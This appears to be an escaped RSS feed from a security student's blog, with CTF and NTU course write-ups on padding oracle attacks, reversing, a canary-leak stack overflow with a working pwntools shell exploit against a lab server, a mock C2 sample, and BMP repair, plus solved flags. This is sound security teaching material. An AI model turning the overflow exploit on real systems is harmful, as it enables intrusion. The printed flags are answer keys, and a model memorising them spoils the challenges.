&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ python exp.py
[(&amp;#39;c&amp;#39;, &amp;#39;3&amp;#39;, &amp;#39;l&amp;#39;), (&amp;#39;u&amp;#39;, &amp;#39;d&amp;#39;, &amp;#39;D&amp;#39;), (&amp;#39;o&amp;#39;, &amp;#39;g&amp;#39;, &amp;#39;Q&amp;#39;), (&amp;#39;V&amp;#39;, &amp;#39;Z&amp;#39;, &amp;#39;G&amp;#39;), (&amp;#39;R&amp;#39;, &amp;#39;U&amp;#39;, &amp;#39;5&amp;#39;), (&amp;#39;7&amp;#39;, &amp;#39;T&amp;#39;, &amp;#39;l&amp;#39;), (&amp;#39;9&amp;#39;, &amp;#39;l&amp;#39;, &amp;#39;T&amp;#39;), (&amp;#39;m&amp;#39;, &amp;#39;Y&amp;#39;, &amp;#39;3&amp;#39;), (&amp;#39;U&amp;#39;, &amp;#39;k&amp;#39;, &amp;#39;V&amp;#39;), (&amp;#39;f&amp;#39;, &amp;#39;N&amp;#39;, &amp;#39;k&amp;#39;), (&amp;#39;U&amp;#39;, &amp;#39;0&amp;#39;, &amp;#39;Q&amp;#39;), (&amp;#39;1&amp;#39;, &amp;#39;U&amp;#39;, &amp;#39;x&amp;#39;), (&amp;#39;U&amp;#39;, &amp;#39;F&amp;#39;, &amp;#39;9&amp;#39;), (&amp;#39;l&amp;#39;, &amp;#39;U&amp;#39;, &amp;#39;m&amp;#39;), (&amp;#39;N&amp;#39;, &amp;#39;F&amp;#39;, &amp;#39;U&amp;#39;), (&amp;#39;m&amp;#39;, &amp;#39;Z&amp;#39;, &amp;#39;S&amp;#39;), (&amp;#39;Q&amp;#39;, &amp;#39;W&amp;#39;, &amp;#39;c&amp;#39;), (&amp;#39;k&amp;#39;, &amp;#39;X&amp;#39;, &amp;#39;0&amp;#39;), (&amp;#39;5&amp;#39;, &amp;#39;f&amp;#39;, &amp;#39;R&amp;#39;), (&amp;#39;2&amp;#39;, &amp;#39;o&amp;#39;, &amp;#39;w&amp;#39;), (&amp;#39;L&amp;#39;, &amp;#39;V&amp;#39;, &amp;#39;E&amp;#39;), (&amp;#39;x&amp;#39;, &amp;#39;W&amp;#39;, &amp;#39;j&amp;#39;), (&amp;#39;N&amp;#39;, &amp;#39;h&amp;#39;, &amp;#39;Z&amp;#39;), (&amp;#39;j&amp;#39;, &amp;#39;E&amp;#39;, &amp;#39;w&amp;#39;), (&amp;#39;Y&amp;#39;, &amp;#39;T&amp;#39;, &amp;#39;Q&amp;#39;), (&amp;#39;x&amp;#39;, &amp;#39;X&amp;#39;, &amp;#39;2&amp;#39;), (&amp;#39;N&amp;#39;, &amp;#39;2&amp;#39;, &amp;#39;c&amp;#39;), (&amp;#39;G&amp;#39;, &amp;#39;d&amp;#39;, &amp;#39;o&amp;#39;), (&amp;#39;R&amp;#39;, &amp;#39;X&amp;#39;, &amp;#39;J&amp;#39;), (&amp;#39;f&amp;#39;, &amp;#39;T&amp;#39;, &amp;#39;m&amp;#39;), (&amp;#39;Z&amp;#39;, &amp;#39;f&amp;#39;, &amp;#39;N&amp;#39;), (&amp;#39;F&amp;#39;, &amp;#39;9&amp;#39;, &amp;#39;l&amp;#39;), (&amp;#39;U&amp;#39;, &amp;#39;n&amp;#39;, &amp;#39;B&amp;#39;), (&amp;#39;H&amp;#39;, &amp;#39;b&amp;#39;, &amp;#39;m&amp;#39;), (&amp;#39;E&amp;#39;, &amp;#39;2&amp;#39;, &amp;#39;S&amp;#39;), (&amp;#39;D&amp;#39;, &amp;#39;F&amp;#39;, &amp;#39;O&amp;#39;), (&amp;#39;R&amp;#39;, &amp;#39;V&amp;#39;, &amp;#39;9&amp;#39;), (&amp;#39;a&amp;#39;, &amp;#39;b&amp;#39;, &amp;#39;j&amp;#39;), (&amp;#39;d&amp;#39;, &amp;#39;l&amp;#39;, &amp;#39;d&amp;#39;), (&amp;#39;m&amp;#39;, &amp;#39;t&amp;#39;, &amp;#39;f&amp;#39;), (&amp;#39;Y&amp;#39;, &amp;#39;m&amp;#39;, &amp;#39;V&amp;#39;), (&amp;#39;f&amp;#39;, &amp;#39;d&amp;#39;, &amp;#39;G&amp;#39;), (&amp;#39;V&amp;#39;, &amp;#39;W&amp;#39;, &amp;#39;c&amp;#39;), (&amp;#39;V&amp;#39;, &amp;#39;9&amp;#39;, &amp;#39;i&amp;#39;), (&amp;#39;U&amp;#39;, &amp;#39;1&amp;#39;, &amp;#39;9&amp;#39;), (&amp;#39;G&amp;#39;, &amp;#39;Z&amp;#39;, &amp;#39;E&amp;#39;), (&amp;#39;h&amp;#39;, &amp;#39;A&amp;#39;, &amp;#39;Z&amp;#39;), (&amp;#39;V&amp;#39;, &amp;#39;J&amp;#39;, &amp;#39;f&amp;#39;), (&amp;#39;Q&amp;#39;, &amp;#39;1&amp;#39;, &amp;#39;Z&amp;#39;), (&amp;#39;L&amp;#39;, &amp;#39;c&amp;#39;, &amp;#39;n&amp;#39;), (&amp;#39;l&amp;#39;, &amp;#39;m&amp;#39;, &amp;#39;f&amp;#39;), (&amp;#39;Q&amp;#39;, &amp;#39;=&amp;#39;, &amp;#39;=&amp;#39;)]
c3ludDogQVZGRU57Tl9lTmY3UkVfNkU0Q1UxUF9lUmNFUmZSQWckX05fR2owLVExWjNhZjEwYTQxX2N2cGdoRXJfTmZfNF9lUnBHbmE2SDFORV9abjdldmtfYmVfdGVWcV9iU19GZEhAZVJfQ1ZLcnlmfQ==
b&amp;#39;synt: AVFEN{N_eNf7RE_6E4CU1P_eRcERfRAg$_N_Gj0-Q1Z3af10a41_cvpghEr_Nf_4_eRpGna6H1NE_Zn7evk_be_teVq_bS_FdH@eR_CVKryf}&amp;#39;
&lt;/code>&lt;/pre>&lt;p>Flag: &lt;code>NISRA{A_rAs7ER_6R4PH1C_rEpREsENt$_A_Tw0-D1M3ns10n41_pictuRe_As_4_rEcTan6U1AR_Ma7rix_or_grId_oF_SqU@rE_PIXels}&lt;/code>&lt;/p></description></item><item><title>NTU CS 2023 HW1 Write Up</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/ntu-cs-2023-hw1-write-up/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/ntu-cs-2023-hw1-write-up/</guid><description>&lt;h1 id="ntu-cs-2023-hw1-write-up">
 NTU CS 2023 HW1 Write Up
 &lt;a class="anchor" href="#ntu-cs-2023-hw1-write-up">#&lt;/a>
&lt;/h1>
&lt;p>Name: 何秉學 Student ID: R11921A16
:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="lab-cor">
 Lab-COR
 &lt;a class="anchor" href="#lab-cor">#&lt;/a>
&lt;/h2>
&lt;p>Flag: &lt;code>FLAG{Corre1ati0n_Attack!_!}&lt;/code>&lt;/p>
&lt;h3 id="解題流程與思路">
 解題流程與思路
 &lt;a class="anchor" href="#%e8%a7%a3%e9%a1%8c%e6%b5%81%e7%a8%8b%e8%88%87%e6%80%9d%e8%b7%af">#&lt;/a>
&lt;/h3>
&lt;p>這一題是簡單的padding oracle attack，他一樣是應用在CBC mode上，只是他padding的方式和上課教的有一點不一樣，他會先在最後放一個0x80然後接續放0x00直到長度%16==0，同樣的，我們可以用上課教的方式:&lt;/p>
&lt;ul>
&lt;li>What we have: 我們有的東西就是密文，所以可以利用它動一些手腳&lt;/li>
&lt;li>Our Goal 1: 目標是要取得原本和47進行XOR的數字是多少&lt;/li>
&lt;li>Our Goal 2: 這樣才可以取得最後的明文69
&lt;img src="https://hackmd.io/_uploads/r1p3yoGlp.png" alt="" />&lt;/li>
&lt;li>How to achieve: 我們可以簡單猜一個byte，從0x00開始，把密文換成猜測的byte，這樣256種組合和原本的Goal 1所求的byte進行XOR後會padding正確(也就是0x01)，此時假設我們已經猜到目前是0x2f符合padding正確的目標，代表現在的假明文是0x01，則原本和0x47進行XOR的數字就是0x01⊕0x2f，然後我們就可以回到原本解密的流程，也就是原本的密文0x47⊕剛剛得知的(0x01⊕0x2f)，就會得到想要的正確的明文0x69
&lt;img src="https://hackmd.io/_uploads/H1yKboMlp.png" alt="" />&lt;/li>
&lt;/ul>
&lt;p>所以套用到今天的lab意思也是一樣，如果要知道padding是否正確可以問oracle，反正只要符合明文+0x80+(0&amp;hellip;15)*0x00，這一題的flag長度可以從題目給的ciphertext看出來，顯然扣掉16bytes的initial vector後，flag的長度是32 bytes，也就是說我們從第二個block開始解，我們可以單獨把第一個ciphertext block當成第二個ciphertext block的initial vector，合併後再一起送出去，然後不斷變化IV的最後一個byte，如果oracle回傳&lt;code>Well received :)&lt;/code>代表第一個bytes猜對了，我們就可以把flag的最後一個bytes求出來$\to$我們猜的byte⊕原本ciphertext的最後一個byte⊕0x80(0x80是我們判斷padding正確的依據)，當然找到真正的plaintext byte後要把我們猜測的block恢復原狀，接著繼續找下一個byte&lt;/p>
&lt;h2 id="lab-lsb">
 Lab-LSB
 &lt;a class="anchor" href="#lab-lsb">#&lt;/a>
&lt;/h2>
&lt;p>Flag: &lt;code>FLAG{Viycx_qsklsjgmeld_fgd_spkgjo}&lt;/code>&lt;/p>
&lt;h3 id="解題流程與思路-1">
 解題流程與思路
 &lt;a class="anchor" href="#%e8%a7%a3%e9%a1%8c%e6%b5%81%e7%a8%8b%e8%88%87%e6%80%9d%e8%b7%af-1">#&lt;/a>
&lt;/h3>
&lt;p>這一題是變形過的Lease Significant Bit，上課教的例子是mod 2下的結果，而看source code可以知道目前他是mod 3下的結果，但換湯不換藥，只要把上課教的部分全部換成mod 3就可以了&lt;/p></description></item><item><title>NTU CS 2023 HW2 Write Up</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/ntu-cs-2023-hw2-write-up/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/ntu-cs-2023-hw2-write-up/</guid><description>&lt;h1 id="ntu-cs-2023-hw2-write-up">
 NTU CS 2023 HW2 Write Up
 &lt;a class="anchor" href="#ntu-cs-2023-hw2-write-up">#&lt;/a>
&lt;/h1>
&lt;p>Name: 何秉學 Student ID: R11921A16
:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="lab-hellorevworld">
 Lab-HelloRevWorld
 &lt;a class="anchor" href="#lab-hellorevworld">#&lt;/a>
&lt;/h2>
&lt;p>Flag: &lt;code>FLAG{h311O_revers1ng_3ngineer5}&lt;/code>&lt;/p>
&lt;h3 id="解題流程與思路">
 解題流程與思路
 &lt;a class="anchor" href="#%e8%a7%a3%e9%a1%8c%e6%b5%81%e7%a8%8b%e8%88%87%e6%80%9d%e8%b7%af">#&lt;/a>
&lt;/h3>
&lt;p>這一題主要是練習如何把如何把bytes變成字串:&lt;/p>
&lt;ol>
&lt;li>可以先把bytes的型別定義好(單獨的bytes變成array)，變成array有兩種方法，第一種是直接用&lt;code>Y&lt;/code>定義他的型別成&lt;code>int dword_2008[32]&lt;/code>，前面的int就看每一個字元是來決定，後面&lt;code>[32]&lt;/code>就代表有多少字元變成array；第二種方法就是直接按&lt;code>d&lt;/code>改變一個字元的型態變成int，然後在&lt;code>edit/Array&lt;/code>的地方可以叫出&lt;code>Convert to array&lt;/code>的視窗(如果前面沒有先用&lt;code>d&lt;/code>改變型態的話，他會以為所有字元都是一個byte，然後總共有128個字元這樣換算，但其實我們是總共32個字元，每一個字元是4個bytes，也就是int，這一點要特別注意)
&lt;img src="https://hackmd.io/_uploads/HJ3yvI-Ga.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/r1A_8LWMa.png" alt="" />&lt;/li>
&lt;li>接著就是在&lt;code>Option/String literals&lt;/code>視窗中設定用哪一個型態表示字串，這邊因為每一個字元都是4 bytes，也就是32 bits，所以選擇C-style
&lt;img src="https://hackmd.io/_uploads/SyQBP8Zfp.png" alt="" />
:::spoiler 完整流程&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>.rodata:0000000000002008 unk_2008 db 46h ; F ; DATA XREF: main+8↑o
.rodata:0000000000002009 db 0
.rodata:000000000000200A db 0
.rodata:000000000000200B db 0
.rodata:000000000000200C db 4Ch ; L
.rodata:000000000000200D db 0
.rodata:000000000000200E db 0
.rodata:000000000000200F db 0
.rodata:0000000000002010 db 41h ; A
.rodata:0000000000002011 db 0
.rodata:0000000000002012 db 0
.rodata:0000000000002013 db 0
.rodata:0000000000002014 db 47h ; G
.rodata:0000000000002015 db 0
.rodata:0000000000002016 db 0
.rodata:0000000000002017 db 0
.rodata:0000000000002018 db 7Bh ; {
.rodata:0000000000002019 db 0
.rodata:000000000000201A db 0
.rodata:000000000000201B db 0
.rodata:000000000000201C db 68h ; h
.rodata:000000000000201D db 0
.rodata:000000000000201E db 0
.rodata:000000000000201F db 0
.rodata:0000000000002020 db 33h ; 3
.rodata:0000000000002021 db 0
.rodata:0000000000002022 db 0
.rodata:0000000000002023 db 0
.rodata:0000000000002024 db 31h ; 1
.rodata:0000000000002025 db 0
.rodata:0000000000002026 db 0
.rodata:0000000000002027 db 0
.rodata:0000000000002028 db 31h ; 1
.rodata:0000000000002029 db 0
.rodata:000000000000202A db 0
.rodata:000000000000202B db 0
.rodata:000000000000202C db 4Fh ; O
.rodata:000000000000202D db 0
.rodata:000000000000202E db 0
.rodata:000000000000202F db 0
.rodata:0000000000002030 db 5Fh ; _
.rodata:0000000000002031 db 0
.rodata:0000000000002032 db 0
.rodata:0000000000002033 db 0
.rodata:0000000000002034 db 72h ; r
.rodata:0000000000002035 db 0
.rodata:0000000000002036 db 0
.rodata:0000000000002037 db 0
.rodata:0000000000002038 db 65h ; e
.rodata:0000000000002039 db 0
.rodata:000000000000203A db 0
.rodata:000000000000203B db 0
.rodata:000000000000203C db 76h ; v
.rodata:000000000000203D db 0
.rodata:000000000000203E db 0
.rodata:000000000000203F db 0
.rodata:0000000000002040 db 65h ; e
.rodata:0000000000002041 db 0
.rodata:0000000000002042 db 0
.rodata:0000000000002043 db 0
.rodata:0000000000002044 db 72h ; r
.rodata:0000000000002045 db 0
.rodata:0000000000002046 db 0
.rodata:0000000000002047 db 0
.rodata:0000000000002048 db 73h ; s
.rodata:0000000000002049 db 0
.rodata:000000000000204A db 0
.rodata:000000000000204B db 0
.rodata:000000000000204C db 31h ; 1
.rodata:000000000000204D db 0
.rodata:000000000000204E db 0
.rodata:000000000000204F db 0
.rodata:0000000000002050 db 6Eh ; n
.rodata:0000000000002051 db 0
.rodata:0000000000002052 db 0
.rodata:0000000000002053 db 0
.rodata:0000000000002054 db 67h ; g
.rodata:0000000000002055 db 0
.rodata:0000000000002056 db 0
.rodata:0000000000002057 db 0
.rodata:0000000000002058 db 5Fh ; _
.rodata:0000000000002059 db 0
.rodata:000000000000205A db 0
.rodata:000000000000205B db 0
.rodata:000000000000205C db 33h ; 3
.rodata:000000000000205D db 0
.rodata:000000000000205E db 0
.rodata:000000000000205F db 0
.rodata:0000000000002060 db 6Eh ; n
.rodata:0000000000002061 db 0
.rodata:0000000000002062 db 0
.rodata:0000000000002063 db 0
.rodata:0000000000002064 db 67h ; g
.rodata:0000000000002065 db 0
.rodata:0000000000002066 db 0
.rodata:0000000000002067 db 0
.rodata:0000000000002068 db 69h ; i
.rodata:0000000000002069 db 0
.rodata:000000000000206A db 0
.rodata:000000000000206B db 0
.rodata:000000000000206C db 6Eh ; n
.rodata:000000000000206D db 0
.rodata:000000000000206E db 0
.rodata:000000000000206F db 0
.rodata:0000000000002070 db 65h ; e
.rodata:0000000000002071 db 0
.rodata:0000000000002072 db 0
.rodata:0000000000002073 db 0
.rodata:0000000000002074 db 65h ; e
.rodata:0000000000002075 db 0
.rodata:0000000000002076 db 0
.rodata:0000000000002077 db 0
.rodata:0000000000002078 db 72h ; r
.rodata:0000000000002079 db 0
.rodata:000000000000207A db 0
.rodata:000000000000207B db 0
.rodata:000000000000207C db 35h ; 5
.rodata:000000000000207D db 0
.rodata:000000000000207E db 0
.rodata:000000000000207F db 0
.rodata:0000000000002080 db 7Dh ; }
.rodata:0000000000002081 db 0
.rodata:0000000000002082 db 0
.rodata:0000000000002083 db 0
.rodata:0000000000002084 db 0
.rodata:0000000000002085 db 0
.rodata:0000000000002086 db 0
.rodata:0000000000002087 db 0
&lt;/code>&lt;/pre>&lt;p>$\downarrow$&lt;/p></description></item><item><title>NTU CS 2023 HW3 Write Up</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/ntu-cs-2023-hw3-write-up/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/ntu-cs-2023-hw3-write-up/</guid><description>&lt;h1 id="ntu-cs-2023-hw3-write-up">
 NTU CS 2023 HW3 Write Up
 &lt;a class="anchor" href="#ntu-cs-2023-hw3-write-up">#&lt;/a>
&lt;/h1>
&lt;h2 id="lab-stackoverflow">
 Lab-Stackoverflow
 &lt;a class="anchor" href="#lab-stackoverflow">#&lt;/a>
&lt;/h2>
&lt;p>Flag: &lt;code>flag{Y0u_know_hoW2L3@k_canAry}&lt;/code>&lt;/p>
&lt;h3 id="解題流程與思路">
 解題流程與思路
 &lt;a class="anchor" href="#%e8%a7%a3%e9%a1%8c%e6%b5%81%e7%a8%8b%e8%88%87%e6%80%9d%e8%b7%af">#&lt;/a>
&lt;/h3>
&lt;p>這一題就是前一年的&lt;a href="https://hackmd.io/@SBK6401/BJijt4A9s">Leak Canary&lt;/a>的應用版，當時是用pwndbg，還不知道gef的偉大，總之這一題的思路就是:&lt;/p>
&lt;ol>
&lt;li>接收開shell的function的address(win function)&lt;/li>
&lt;li>接收0x20個bytes，分別代表RSP value/Stack Canary/RBP value/RIP&lt;/li>
&lt;li>傳送payload過去，分別是&lt;code>p64(rsp_val) + p64(stack_canary) + p64(rbp_val) + p64(win_addr)&lt;/code>&lt;/li>
&lt;li>這樣就可以蓋到RIP後又不會被偵測到canary被改變，return之後拿到shell&lt;/li>
&lt;/ol>
&lt;p>:::info
比較值得注意的是，因為我是在公布解答前先自己寫，遇到了return之後拿不到shell的問題，後來經過助教的解釋才知道原來是，開shell的過程中&lt;code>&amp;lt;do_system+115&amp;gt; movaps XMMWORD PTR [rsp], xmm1&lt;/code>，RSP必須要是對齊的狀態，也就是最後應該要是0，但可以看下圖，如果直接跳到win function的開頭，rsp就不是0，會偏移8 bytes，所以會出現SIGSEGV
&lt;img src="https://hackmd.io/_uploads/rJK-2d0ma.png" alt="圖片" />&lt;/p>
&lt;p>解決方式有兩個，一個是少push一次，一個是多pop一次，這樣就可以校正RSP回到0結尾的狀態，所以我們才要在RIP的地方加上(0xf1-0xe9)的offset，讓RIP可以少push一次，這樣就可以解決問題
&lt;img src="https://hackmd.io/_uploads/ByhF2OCQa.png" alt="圖片" />&lt;/p>
&lt;p>&lt;img src="https://hackmd.io/_uploads/SyxvoO0Xa.png" alt="圖片" />
:::&lt;/p>
&lt;h3 id="exploit---leak-canary--control-rip">
 Exploit - Leak Canary + Control RIP
 &lt;a class="anchor" href="#exploit---leak-canary--control-rip">#&lt;/a>
&lt;/h3>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from pwn import *

# r = process(&amp;#39;./lab&amp;#39;)
r = remote(&amp;#39;10.113.184.121&amp;#39;, 10041)

r.recvuntil(b&amp;#39;Gift: 0x&amp;#39;)
win_addr = int(r.recvline().strip(), 16) + (0xf1 - 0xe9)
r.recvuntil(b&amp;#39;Gift2: &amp;#39;)
rsp_val = u64(r.recv(0x8))
stack_canary = u64(r.recv(0x8))
rbp_val = u64(r.recv(0x8))
rip = u64(r.recv(0x8))

log.info(f&amp;#39;win address = {hex(win_addr)}&amp;#39;)
log.info(f&amp;#39;RSP value = {hex(rsp_val)}&amp;#39;)
log.info(f&amp;#39;Stack Canary = {hex(stack_canary)}&amp;#39;)
log.info(f&amp;#39;RBP value = {hex(rbp_val)}&amp;#39;)
log.info(f&amp;#39;RIP value = {hex(rip)}&amp;#39;)

payload = p64(rsp_val) + p64(stack_canary) + p64(rbp_val) + p64(win_addr)
log.info(f&amp;#39;Payload = {payload}&amp;#39;)
# raw_input()
r.sendline(payload)

r.interactive()
&lt;/code>&lt;/pre>&lt;h2 id="lab-shellcode">
 Lab-Shellcode
 &lt;a class="anchor" href="#lab-shellcode">#&lt;/a>
&lt;/h2>
&lt;p>Flag: &lt;code>flag{How_you_do0o0o0o_sysca1111111}&lt;/code>&lt;/p></description></item><item><title>NTU CS HW0 Write Up</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/welcome/ntu-cs-hw0-write-up/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/welcome/ntu-cs-hw0-write-up/</guid><description>&lt;h1 id="ntu-cs-hw0-write-up">
 NTU CS HW0 Write Up
 &lt;a class="anchor" href="#ntu-cs-hw0-write-up">#&lt;/a>
&lt;/h1>
&lt;p>:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="easy-c2">
 Easy C2
 &lt;a class="anchor" href="#easy-c2">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Flag: &lt;code>FLAG{C2_cmd_in_http_header}&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h3>
&lt;p>我們獵捕到一隻惡意程式，它似乎有與 C2 進行互動的行為。請找出它發送給 C2 的訊息。Flag 格式為：FLAG{&amp;hellip;}。
此題模仿惡意程式與 C2 進行溝通的行為，期望能在對不熟悉逆向的同學而言不過度困難的情況下，讓同學對惡意程式行為有初步的認識。題目本身並沒有實際的惡意或影響系統運作的行為，因此可以安心執行。建議同學可以先嘗試執行程式，觀察程式的行為，嘗試找出 C2 位址以及如何與其溝通。&lt;/p>
&lt;p>Google 關鍵字：IDA freeware、Ghidra、malware C2&lt;/p>
&lt;h3 id="解題思路">
 解題思路
 &lt;a class="anchor" href="#%e8%a7%a3%e9%a1%8c%e6%80%9d%e8%b7%af">#&lt;/a>
&lt;/h3>
&lt;ol>
&lt;li>Simple 解題思路
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ file easy-c2
easy-c2: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8fa6ee42a706cfc93d97d04b3ff5e300b9f8ae02, for GNU/Linux 3.2.0, with debug_info, not stripped
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>IDA
&lt;pre tabindex="0">&lt;code class="language-cpp!" data-lang="cpp!">int __cdecl main(int argc, const char **argv, const char **envp)
{
 int sockfd; // [rsp+1Ch] [rbp-24h]
 char *flag; // [rsp+20h] [rbp-20h] BYREF
 char *enc_flag; // [rsp+28h] [rbp-18h]
 char *host; // [rsp+30h] [rbp-10h]
 unsigned __int64 v8; // [rsp+38h] [rbp-8h]

 v8 = __readfsqword(0x28u);
 enc_flag = byte_20F0;
 host = &amp;#34;127.0.0.1&amp;#34;;
 sockfd = socket_connect(&amp;#34;127.0.0.1&amp;#34;, 11187);
 decode_flag(&amp;amp;flag, byte_20F0);
 send_msg(sockfd, flag);
 puts(&amp;#34;Message sent.&amp;#34;);
 sleep(1u);
 free(flag);
 close(sockfd);
 return 0;
}
&lt;/code>&lt;/pre>可以看得出來他會連localhost:11187，然後把decode過後的flag給送出去，所以只要會nc的都可以直接聽該port的訊息&lt;/li>
&lt;/ol>
&lt;h3 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h3>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ nc -lvp 11187
Listening on 0.0.0.0 11187
Connection received on localhost 54028
GET / HTTP/1.0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko, FLAG{C2_cmd_in_http_header}) Chrome/51.0.2704.103 Safari/537.36
&lt;/code>&lt;/pre>&lt;h2 id="baby-crackme">
 Baby Crackme
 &lt;a class="anchor" href="#baby-crackme">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Flag: &lt;code>FLAG{r0ll1ng_4nd_3xtr4ct_t0_m3m0ry}&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="description-1">
 Description
 &lt;a class="anchor" href="#description-1">#&lt;/a>
&lt;/h3>
&lt;p>透過此題目希望學生們可以先自行摸索過各種 SRE(Software Reverse-Engineering) 的工具與流程。 給你一些關鍵字用: IDA Freeware, Ghidra, gdb (GNU Debugger), Dynamic Analysis&lt;/p></description></item><item><title>PicoCTF - `tunn3l v1s10n`</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/image-stego/picoctf---tunn3l-v1s10n/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/image-stego/picoctf---tunn3l-v1s10n/</guid><description>&lt;h1 id="picoctf---tunn3l-v1s10n">
 PicoCTF - &lt;code>tunn3l v1s10n&lt;/code>
 &lt;a class="anchor" href="#picoctf---tunn3l-v1s10n">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-misc">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/112?category=4&amp;amp;page=1">tunn3l v1s10n&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.jinnsblog.com/2009/08/bmp-format-graphic-illustration.html">[筆記] BMP點陣圖格式說明&lt;/a>&lt;/p>
&lt;h2 id="exploit---recover-file">
 Exploit - Recover file
 &lt;a class="anchor" href="#exploit---recover-file">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>Analyze
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ exiftool tunn3l_v1s10n
ExifTool Version Number : 11.88
File Name : tunn3l_v1s10n
Directory : .
File Size : 2.8 MB
File Modification Date/Time : 2023:02:17 04:11:33+08:00
File Access Date/Time : 2023:02:17 04:12:37+08:00
File Inode Change Date/Time : 2023:02:17 04:11:35+08:00
File Permissions : rw-r--r--
File Type : BMP
File Type Extension : bmp
MIME Type : image/bmp
BMP Version : Unknown (53434)
Image Width : 1134
Image Height : 306
Planes : 1
Bit Depth : 24
Compression : None
Image Length : 2893400
Pixels Per Meter X : 5669
Pixels Per Meter Y : 5669
Num Colors : Use BitDepth
Num Important Colors : All
Red Mask : 0x27171a23
Green Mask : 0x20291b1e
Blue Mask : 0x1e212a1d
Alpha Mask : 0x311a1d26
Color Space : Unknown (,5%()
Rendering Intent : Unknown (826103054)
Image Size : 1134x306
Megapixels : 0.347
&lt;/code>&lt;/pre>It seems a &lt;code>bmp&lt;/code> file and check the file signature of the 2 bytes is &lt;code>42 4D&lt;/code> :heavy_check_mark:&lt;/li>
&lt;li>Check file headers
According to &lt;a href="https://en.wikipedia.org/wiki/BMP_file_format">BMP_file_format&lt;/a> and &lt;a href="https://www.jinnsblog.com/2009/08/bmp-format-graphic-illustration.html">BMP點陣圖格式說明&lt;/a>
&lt;img src="https://i.imgur.com/YU6exro.png" alt="" />
&lt;ul>
&lt;li>:heavy_check_mark:size: &lt;code>8E 26 2C 00&lt;/code> $\to$ &lt;code>0x2C268E&lt;/code> $\to$ &lt;code>2893454 bytes&lt;/code>
&lt;img src="https://i.imgur.com/H6G44kT.png" alt="" />&lt;/li>
&lt;li>:heavy_check_mark:reserved1: &lt;code>00 00&lt;/code>&lt;/li>
&lt;li>:heavy_check_mark:reserved2: &lt;code>00 00&lt;/code>&lt;/li>
&lt;li>:negative_squared_cross_mark:offset: &lt;code>BA D0 00 00&lt;/code> $\to$ &lt;code>0xD0BA&lt;/code> $\to$ &lt;code>53434&lt;/code> means it&amp;rsquo;ll read the bitmap data from offset 53434 bytes. But actually, the data of bitmap is just connect with the header. So, we just need to shift 14 bytes for file header + 40 bytes for info header = 54 bytes $\to$ &lt;code>0x36&lt;/code>
&lt;img src="https://i.imgur.com/crETYOD.png" alt="" />&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;hr>
&lt;p>We can peek the data first&amp;hellip;
&lt;img src="https://i.imgur.com/DWesnDl.png" alt="" />
It said &lt;code>notaflag{sorry}&lt;/code>, means we need to recover other parts.&lt;/p></description></item><item><title>PicoCTF - `Wireshark doo dooo do doo...`</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/flow/picoctf---wireshark-doo-dooo-do-doo.../</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/flow/picoctf---wireshark-doo-dooo-do-doo.../</guid><description>&lt;h1 id="picoctf---wireshark-doo-dooo-do-doo">
 PicoCTF - &lt;code>Wireshark doo dooo do doo...&lt;/code>
 &lt;a class="anchor" href="#picoctf---wireshark-doo-dooo-do-doo">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-misc">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-misc">#&lt;/a>
&lt;/h6>
